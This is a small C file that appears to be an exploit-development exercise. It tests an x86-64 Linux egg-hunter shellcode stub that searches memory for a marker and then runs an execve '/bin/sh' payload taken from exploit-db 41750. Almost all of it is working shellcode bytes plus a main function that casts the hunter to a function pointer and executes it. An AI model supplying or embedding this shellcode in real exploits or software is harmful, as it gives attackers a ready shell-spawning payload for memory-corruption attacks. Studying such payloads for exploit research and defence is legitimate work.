//shellcode payload used for testing from: https://www.exploit-db.com/exploits/41750

//================================================================================
//Shellcode (python) :
//shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
//================================================================================


#include <stdio.h>
#include <string.h>

#define EGG "\x50\x90\x50\x90"

unsigned char hunter[] = \
"\x48\x31\xf6\x56\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xed\xb8\x4f\x90\x50\x90\xfe\xc0\xaf\x75\xeb\xff\xe7";

unsigned char payload[] = EGG "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";

int main(void) {
	printf("Egg hunter's size (bytes): %lu\n", strlen(hunter));
	printf("Payload's size (bytes): %lu\n", strlen(payload));
	int (*ret)() = (int(*)())hunter;
	ret();
}
